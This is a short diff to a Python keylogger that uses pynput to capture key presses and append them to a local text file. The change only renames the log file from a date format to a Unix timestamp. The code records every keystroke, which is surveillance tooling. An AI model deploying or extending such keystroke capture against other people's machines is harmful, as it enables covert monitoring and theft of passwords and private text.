@@ -1,6 +1,8 @@
 import pynput
 from pynput.keyboard import Key, Listener
-from datetime import datetime
+import datetime, time
+
+unix_time = int(time.mktime(datetime.datetime.now().timetuple()))
 
 count = 0
 keys = []
@@ -20,8 +22,8 @@ def on_press(key):
 
 
 def write_file(keys):
-    """Save the keystrokes to a textfile with `log_YYYY-MM-DD.txt` format."""
-    with open(f"log_{datetime.today().strftime('%Y-%m-%d')}.txt", "a") as file:
+    """Save the keystrokes to a textfile with `log_[CURRENT UNIX TIME].txt` format."""
+    with open(f"log_{unix_time}.txt", "a") as file:
         for key in keys:
             k = str(key).replace("'", "\n")
             if k.find("space") > 0:
